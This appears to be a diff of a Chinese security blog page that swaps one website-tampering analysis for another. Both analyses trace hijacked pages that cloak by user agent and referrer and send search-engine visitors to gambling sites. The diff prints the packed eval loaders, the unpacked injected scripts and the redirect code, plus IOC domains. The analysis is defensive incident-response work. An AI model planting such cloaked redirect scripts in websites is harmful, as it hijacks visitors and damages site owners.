@@ -9,7 +9,7 @@
 	
 	<title>
 	
-		页面篡改分析一处BoCai页面 | 
+		页面篡改分析-两次js加密案例 | 
 	 
 	x7peeps
 	</title>
@@ -647,7 +647,7 @@
 							</ul>
 			
 							<ul>
-								<li class="file">
+								<li class="file active">
 									<a href="/2021/05/25/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E4%B8%A4%E6%AC%A1js%E5%8A%A0%E5%AF%86%E6%A1%88%E4%BE%8B/">
 										页面篡改分析-两次js加密案例
 									</a>
@@ -692,7 +692,7 @@
 							</ul>
 			
 							<ul>
-								<li class="file active">
+								<li class="file">
 									<a href="/2020/06/11/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90%E4%B8%80%E5%A4%84BoCai%E9%A1%B5%E9%9D%A2/">
 										页面篡改分析一处BoCai页面
 									</a>
@@ -747,12 +747,12 @@
 	<div id="content">
 		<h1 id="article-title">
 
-	页面篡改分析一处BoCai页面
+	页面篡改分析-两次js加密案例
 </h1>
 <div class="article-meta">
 	
 	<span>x7</span>
-	<span>2020-06-11 23:23:00</span>
+	<span>2021-05-25 17:50:20</span>
     
 		<div id="article-categories">
             
@@ -761,92 +761,79 @@
 </div>
 
 <div id="article-content">
-	<p>BoCai网站分析 </p>
-<span id="more"></span>
+	<h2 id="两次js加密案例"><a href="#两次js加密案例" class="headerlink" title="两次js加密案例"></a>两次js加密案例</h2><p>本次案例在日常工作中发现，2次的js加密案例，分享分析过程。</p>
+<img src="/2021/05/25/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E4%B8%A4%E6%AC%A1js%E5%8A%A0%E5%AF%86%E6%A1%88%E4%BE%8B/image-20210601124004491.png" class="" title="image-20210601124004491">
 
+<h3 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h3><p>在访问页面的时候baidu UA导致跳转，源码如下：</p>
+<pre><code>&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;
+&lt;title&gt;&amp;#22836;&amp;#22836;&amp;#124;&amp;#20307;&amp;#32946;&amp;#45;&amp;#23448;&amp;#32593;&lt;/title&gt;
+&lt;meta name=&quot;keywords&quot; content=&quot;&amp;#22836;&amp;#22836;&amp;#124;&amp;#20307;&amp;#32946;&amp;#45;&amp;#23448;&amp;#32593;&quot;/&gt;
+&lt;meta name=&quot;description&quot; content=&quot;&amp;#22836;&amp;#22836;&amp;#124;&amp;#20307;&amp;#32946;&amp;#45;&amp;#23448;&amp;#32593;&amp;#12304;&amp;#23448;&amp;#32593;&amp;#65306;&amp;#97;&amp;#121;&amp;#120;&amp;#98;&amp;#101;&amp;#116;&amp;#57;&amp;#56;&amp;#55;&amp;#46;&amp;#99;&amp;#111;&amp;#109;&amp;#12305;&amp;#25552;&amp;#20379;&quot;/&gt;
+&lt;script&gt;if(navigator.userAgent.toLocaleLowerCase().indexOf(&quot;baidu&quot;) == -1)&#123;document.title =&quot;正常页面的title值xxxx&quot;&#125;&lt;/script&gt;
+&lt;meta property=&quot;og:image&quot; content=&quot;http://www.shsocialcredit.org.cn/logo.png&quot;/&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;eval(function(p,a,c,k,e,r)&#123;e=function(c)&#123;return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&#39;&#39;.replace(/^/,String))&#123;while(c--)r[e(c)]=k[c]||e(c);k=[function(e)&#123;return r[e]&#125;];e=function()&#123;return&#39;\\w+&#39;&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p&#125;(&#39;m(d(p,a,c,k,e,r)&#123;e=d(c)&#123;f c.n(a)&#125;;h(!\&#39;\&#39;.i(/^/,o))&#123;j(c--)r[e(c)]=k[c]||e(c);k=[d(e)&#123;f r[e]&#125;];e=d()&#123;f\&#39;\\\\w+\&#39;&#125;;c=1&#125;;j(c--)h(k[c])p=p.i(q s(\&#39;\\\\b\&#39;+e(c)+\&#39;\\\\b\&#39;,\&#39;g\&#39;),k[c]);f p&#125;(\&#39;1[&quot;2&quot;][&quot;3&quot;](\\\&#39;&lt;0 4=&quot;5/6&quot; 7=&quot;8://9.a/b.c&quot;&gt;&lt;/0&gt;\\\&#39;);\&#39;,l,l,\&#39;t|u|v|x|y|z|A|B|C|D|E|F|G\&#39;.H(\&#39;|\&#39;),0,&#123;&#125;))&#39;,44,44,&#39;|||||||||||||function||return||if|replace|while||13|eval|toString|String||new||RegExp|script|window|document||write|type|text|javascript|src|https|lelele2|com|cp|js|split&#39;.split(&#39;|&#39;),0,&#123;&#125;))
+&lt;/script&gt;
+</code></pre>
+<p>首先页面title被篡改，如果是非baidu UA则会展示正常页面的title值，如果是baidu UA则会使用被篡改的title展示，如百度搜索等。</p>
+<pre><code>eval(function(p,a,c,k,e,r)&#123;e=function(c)&#123;return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&#39;&#39;.replace(/^/,String))&#123;while(c--)r[e(c)]=k[c]||e(c);k=[function(e)&#123;return r[e]&#125;];e=function()&#123;return&#39;\\w+&#39;&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p&#125;(&#39;m(d(p,a,c,k,e,r)&#123;e=d(c)&#123;f c.n(a)&#125;;h(!\&#39;\&#39;.i(/^/,o))&#123;j(c--)r[e(c)]=k[c]||e(c);k=[d(e)&#123;f r[e]&#125;];e=d()&#123;f\&#39;\\\\w+\&#39;&#125;;c=1&#125;;j(c--)h(k[c])p=p.i(q s(\&#39;\\\\b\&#39;+e(c)+\&#39;\\\\b\&#39;,\&#39;g\&#39;),k[c]);f p&#125;(\&#39;1[&quot;2&quot;][&quot;3&quot;](\\\&#39;&lt;0 4=&quot;5/6&quot; 7=&quot;8://9.a/b.c&quot;&gt;&lt;/0&gt;\\\&#39;);\&#39;,l,l,\&#39;t|u|v|x|y|z|A|B|C|D|E|F|G\&#39;.H(\&#39;|\&#39;),0,&#123;&#125;))&#39;,44,44,&#39;|||||||||||||function||return||if|replace|while||13|eval|toString|String||new||RegExp|script|window|document||write|type|text|javascript|src|https|lelele2|com|cp|js|split&#39;.split(&#39;|&#39;),0,&#123;&#125;))
+</code></pre>
+<p>eval内容为主要跳转内容，通常这种形式考虑js加密，但此内容发现一层嵌套格式，而且js解完如下，仍然为js加密形式：</p>
+<pre><code>eval(function(p,a,c,k,e,r)&#123;e=function(c)&#123;return c.toString(a)&#125;;if(!&#39;&#39;.replace(/^/,String))&#123;while(c--)r[e(c)]=k[c]||e(c);k=[function(e)&#123;return r[e]&#125;];e=function()&#123;return&#39;\\w+&#39;&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p&#125;(&#39;1[&quot;2&quot;][&quot;3&quot;](\&#39;&lt;0 4=&quot;5/6&quot; 7=&quot;8://9.a/b.c&quot;&gt;&lt;/0&gt;\&#39;);&#39;,13,13,&#39;script|window|document|write|type|text|javascript|src|https|lelele2|com|cp|js&#39;.split(&#39;|&#39;),0,&#123;&#125;))
+</code></pre>
+<p>再次进行解密最终显示出其跳转：</p>
+<pre><code>window[&quot;document&quot;][&quot;write&quot;](&#39;&lt;script type=&quot;text/javascript&quot; src=&quot;https[://]lelele2[.]com[/]cp[.]js&quot;&gt;&lt;/script&gt;&#39;);
+</code></pre>
+<p>通过跟踪脚本内容可以看到，该样本先将统计信息发送到360，百度。之后通过在原页面中写入跳转脚本，实现跳转</p>
+<pre><code>var _hmt = _hmt || [];
+(function() &#123;
+  var hm = document.createElement(&quot;script&quot;);
+  hm.src = &quot;https://hm.baidu.com/hm.js?2a49ee9e85a5fb54cf65d27a54cf81b6&quot;;
+  var s = document.getElementsByTagName(&quot;script&quot;)[0]; 
+  s.parentNode.insertBefore(hm, s);
+&#125;)();
+(function () &#123;
+    /*百度推送代码*/
+     var bp = document.createElement(&#39;script&#39;);
+     bp.src = &#39;//push.zhanzhang.baidu.com/push.js&#39;;
+     var s = document.getElementsByTagName(&quot;script&quot;)[0];
+     s.parentNode.insertBefore(bp, s);
+     /*360推送代码*/
+     var src = document.location.protocol + &#39;//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9&#39;;
+     document.write(&#39;&lt;script src=&quot;&#39; + src + &#39;&quot; id=&quot;sozz&quot;&gt;&lt;\/script&gt;&#39;);
+     &#125;)();
 
-<h4 id="样本基本情况"><a href="#样本基本情况" class="headerlink" title="样本基本情况"></a>样本基本情况</h4><p>本次样本如下：</p>
-<pre><code class="html">&lt;script language=&quot;javascript&quot; src=&quot;http://count5.51yes.com/click.aspx?id=51378275&amp;logo=1&quot; charset=&quot;gb2312&quot;&gt;&lt;/script&gt;
-&lt;script src=http://www.616321.com/1.js &gt;&lt;/script&gt;
-......
-&lt;body&gt;&lt;div class=&quot;z7z8z9z6&quot; style=&quot;position:fixed;left:-3000px;top:-3000px;&quot;&gt;
-&lt;li&gt;&lt;a href=&#39;http://www.kfqrlzy.com/20181223241252775444.html&#39;&gt;http://www.kfqrlzy.com/20181223241252775444.html&lt;/a&gt;&lt;/li&gt;
-......
-&lt;/div class=&quot;z7z8z9z6&quot;&gt;
-......
+document.writeln(&quot;&lt;script LANGUAGE=\&quot;Javascript\&quot;&gt;&quot;);
+document.writeln(&quot;var s=document.referrer&quot;);
+document.writeln(&quot;if(s.indexOf(\&quot;baidu\&quot;)&gt;0 || s.indexOf(\&quot;sogou\&quot;)&gt;0 || s.indexOf(\&quot;soso\&quot;)&gt;0 ||s.indexOf(\&quot;sm\&quot;)&gt;0 ||s.indexOf(\&quot;uc\&quot;)&gt;0 ||s.indexOf(\&quot;bing\&quot;)&gt;0 ||s.indexOf(\&quot;yahoo\&quot;)&gt;0 ||s.indexOf(\&quot;so\&quot;)&gt;0 )&quot;);
+document.writeln(&quot;location.href=\&quot;https[://]2021531[.]com\&quot;;&quot;);
+document.writeln(&quot;&lt;/script&gt;&quot;);
 </code></pre>
-<h4 id="概要分析"><a href="#概要分析" class="headerlink" title="概要分析"></a>概要分析</h4><h5 id="0x01http-count5-51yes-com-click-aspx-id-51378275-amp-logo-1-quot"><a href="#0x01http-count5-51yes-com-click-aspx-id-51378275-amp-logo-1-quot" class="headerlink" title="0x01http://count5.51yes.com/click.aspx?id=51378275&amp;logo=1&quot;"></a>0x01<code>http://count5.51yes.com/click.aspx?id=51378275&amp;logo=1&quot;</code></h5><p>执行收集访问者信息并发送到<code>http://count5.51yes.com/sa.htm</code>统计的行为，该行为通常为收集信息行为，方便进行访问用户信息统计及身份识别。</p>
-<pre><code class="html">function y_gVal(iz)&#123;
-                    var endstr=document.cookie.indexOf(&quot;;&quot;,iz);
-                    if(endstr==-1) endstr=document.cookie.length;
-                    return document.cookie.substring(iz,endstr);
-                    &#125;
-function y_g(name)&#123;
-                    var arg=name+&quot;=&quot;;
-                    var alen=arg.length;
-                    var clen=document.cookie.length;
-                    var i=0;var j;
-                    while(i&lt;clen) &#123;
-                                  j=i+alen;
-                                  if(document.cookie.substring(i,j)==arg) return y_gVal(j);
-                                  i=document.cookie.indexOf(&quot; &quot;,i)+1;
-                                  if(i==0) break;
-                                  &#125;
-                    return null;
-                    &#125;
-function cc_k()&#123;
-                var y_e=new Date();
-                var y_t=93312000;var yesvisitor=1000*36000;
-                var yesctime=y_e.getTime();
-                y_e.setTime(y_e.getTime()+y_t);
-                var yesiz=document.cookie.indexOf(&quot;cck_lasttime&quot;);
-                if(yesiz==-1)&#123;
-                             document.cookie=&quot;cck_lasttime=&quot;+yesctime+&quot;; expires=&quot; + y_e.toGMTString() +  &quot;; path=/&quot;;
-                             document.cookie=&quot;cck_count=0; expires=&quot; + y_e.toGMTString() +  &quot;; path=/&quot;;return 0;
-                &#125;
-                else&#123;
-                      var y_c1=y_g(&quot;cck_lasttime&quot;);
-                      var y_c2=y_g(&quot;cck_count&quot;);
-                      y_c1=parseInt(y_c1);
-                      y_c2=parseInt(y_c2);
-                      y_c3=yesctime-y_c1;
-                      if(y_c3&gt;yesvisitor)&#123;
-                                          y_c2=y_c2+1;
-                                          document.cookie=&quot;cck_lasttime=&quot;+yesctime+&quot;; expires=&quot;+y_e.toGMTString()+&quot;; path=/&quot;;
-                                          document.cookie=&quot;cck_count=&quot;+y_c2+&quot;; expires=&quot;+y_e.toGMTString()+&quot;; path=/&quot;;
-                        &#125;
-                    return y_c2;
-                    &#125;
-&#125;
-var yesdata;
-yesdata=&#39;&amp;refe=&#39;+escape(document.referrer)+&#39;&amp;location=&#39;+escape(document.location)+&#39;&amp;color=&#39;+screen.colorDepth+&#39;x&amp;resolution=&#39;+screen.width+&#39;x&#39;+screen.height+&#39;&amp;returning=&#39;+cc_k()+&#39;&amp;language=&#39;+navigator.systemLanguage+&#39;&amp;ua=&#39;+escape(navigator.userAgent);
-document.write(&#39;&lt;a href=&quot;http://countt.51yes.com/index.aspx?id=51378275&quot; target=_blank&gt;&lt;img width=20 height=20 border=0 hspace=0 vspace=0 src=&quot;http://count5.51yes.com/count1.gif&quot; alt=&quot;51YES网站统计系统&quot;&gt;&lt;/a&gt;&#39;);
-document.write(&#39;&lt;iframe MARGINWIDTH=0 MARGINHEIGHT=0 HSPACE=0 VSPACE=0 FRAMEBORDER=0 SCROLLING=no src=http://count5.51yes.com/sa.htm?id=51378275&#39;+yesdata+&#39; height=0 width=0&gt;&lt;/iframe&gt;&#39;);
+<p>10s跳转页面，加载http[]://]lelele1[/]yb.js （无效）脚本（此内容根据推断应该为http[]://]lelele1[.]com[/]yb.js此脚本同上面一个脚本，实际上可以确保如果一个没有跳转，功能相同可能这里被改成了无效）</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;爱游戏官网 &lt;/title&gt;
+...
+&lt;script src=&quot;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#108;&amp;#101;&amp;#108;&amp;#101;&amp;#108;&amp;#101;&amp;#49;&amp;#47;&amp;#121;&amp;#98;&amp;#46;&amp;#106;&amp;#115;&quot;&gt;&lt;/script&gt;
+  &lt;script&gt;
+          setTimeout(function()&#123;
+           var arr=[&#39;https[://]ayxvip8855[.]com&#39;,];
+          window.location.href=arr[parseInt(Math.random()*arr.length)];
+          &#125;,10);
+     &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;爱游戏官网 马上进入.....&lt;/h1&gt;
+        &lt;h3&gt;正在为您匹配最佳线路.....&lt;/h3&gt;
+        &lt;ul&gt;
+          &lt;li&gt;本站使用：当您访问本站的时候出现不能正常访问，请刷新网站或从新打开访问，系统自动为您匹配最佳访问网址&lt;/li&gt;
+      &lt;li&gt;
+&lt;/body&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;var cnzz_protocol = ((&quot;https:&quot; == document.location.protocol) ? &quot;https://&quot; : &quot;http://&quot;);document.write(unescape(&quot;%3Cspan id=&#39;cnzz_stat_icon_1278159129&#39;%3E%3C/span%3E%3Cscript src=&#39;&quot; + cnzz_protocol + &quot;s9.cnzz.com/z_stat.php%3Fid%3D1278159129%26show%3Dpic&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&quot;));&lt;/script&gt;
+&lt;/html&gt;
 </code></pre>
-<p>根据源码，可知收集的信息有：Referer,User-Agent,Location,屏幕色彩,屏幕分辨率，系统语言等。最后讲这些信息拼凑成yesdata字段发送到count5.51yes.com做记录。</p>
-<h5 id="0x02-http-www-616321-com-1-js-已无法访问"><a href="#0x02-http-www-616321-com-1-js-已无法访问" class="headerlink" title="0x02 http://www.616321.com/1.js(已无法访问)"></a>0x02 <code>http://www.616321.com/1.js</code>(已无法访问)</h5><h5 id="0x03-http-www-kfqrlzy-com-20181223241252775444-html"><a href="#0x03-http-www-kfqrlzy-com-20181223241252775444-html" class="headerlink" title="0x03 http://www.kfqrlzy.com/20181223241252775444.html"></a>0x03 <code>http://www.kfqrlzy.com/20181223241252775444.html</code></h5><pre><code>&lt;script language=&quot;javascript&quot; src=&quot;http://count19.51yes.com/click.aspx?id=191757168&amp;logo=1&quot; charset=&quot;gb2312&quot;&gt;
-&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.616321.com/sd.js&quot;&gt;&lt;/script&gt;
-</code></pre>
-<p>分析可知<code>http://count19.51yes.com/click.aspx?id=191757168&amp;logo=1</code>同上统计作用。<br>而<code>http://www.616321.com/sd.js</code>源码如下，并且我们可以推测上面1.js极有可能使用的是同样的代码。下面为sd.js的源码：</p>
-<pre><code class="javascript">var sUserAgent= navigator.userAgent.toLowerCase();
-var bIsIphoneOs= sUserAgent.match(/iphone/i) == &quot;iphone&quot;;
-var bIsSymb= sUserAgent.match(/symbianos/i) == &quot;symbianos&quot;;
-var bIsIpad= sUserAgent.match(/ipad/i) == &quot;ipad&quot;;
-var bIsIpod= sUserAgent.match(/ipod/i) == &quot;ipod&quot;;
-var bIsAndroid= sUserAgent.match(/android/i) == &quot;android&quot;;
-var bIsCE= sUserAgent.match(/windows ce/i) == &quot;windows ce&quot;;
-var bIsWM= sUserAgent.match(/windows mobile/i) == &quot;windows mobile&quot;;
-var bIsWP= sUserAgent.match(/windows phone/i) == &quot;windows phone&quot;;
-
-var isBDAPP=sUserAgent.match(/baiduboxapp/i) == &quot;baiduboxapp&quot;;
-var isBDBrowser=sUserAgent.match(/baidubrowser/i) == &quot;baidubrowser&quot;;
-var isM= bIsIphoneOs || bIsSymb || bIsIpad || bIsIpod || bIsAndroid || bIsCE || bIsWM || bIsWP;
-
-if (!isM || (!isBDAPP &amp;&amp; !isBDBrowser))&#123;
-  window.location.href=&quot;http://www.450378.com/?a=592088&quot;;
-</code></pre>
-<p>可知该脚本在执行的过程中进行UA判断，并通过判断指定来自百度的手机端和电脑端用户进行跳转并引导到BoCai网站<code>http://www.450378.com/?a=592088</code>。<br><img src="http://xtpeeps.cn/wp-content/uploads/2019/01/c0f95801f90bfe452e46e1ba0c1d83ac.png"><br>最终将导致百度UA进来的用户引导到BoCai网站。</p>
-<h4 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h4><p><code>count5.51yes.com</code><br><code>www.616321.com</code><br><code>www.450378.com</code><br><code>www.kfqrlzy.com</code></p>
+<h5 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h5><p>https[:]//lelele2[.]com[/]cp.js<br>2021531[.]com<br>ayxvip8855[.]com<br><a href="http://lelele1.com[/]yb[.]js">http://lelele1.com[/]yb[.]js</a></p>
 
 </div>
 
@@ -854,16 +841,11 @@ if (!isM || (!isBDAPP &amp;&amp; !isBDBrowser))&#123;
     <div class="post-guide">
         <div class="item left">
             
-              <a href="/2020/07/13/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/">
-                  <i class="fa fa-angle-left" aria-hidden="true"></i>
-                  页面篡改分析-基于sojson.v4混淆的页面篡思路分析
-              </a>
-            
         </div>
         <div class="item right">
             
-              <a href="/2020/05/24/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-JS%E7%9A%84eval()%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E8%B7%B3%E8%BD%AC/">
-                页面篡改分析-JS的eval()加密方式跳转
+              <a href="/2021/05/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%AE%A1%E6%9F%A5/">
+                4系统信息收集
                 <i class="fa fa-angle-right" aria-hidden="true"></i>
               </a>
             
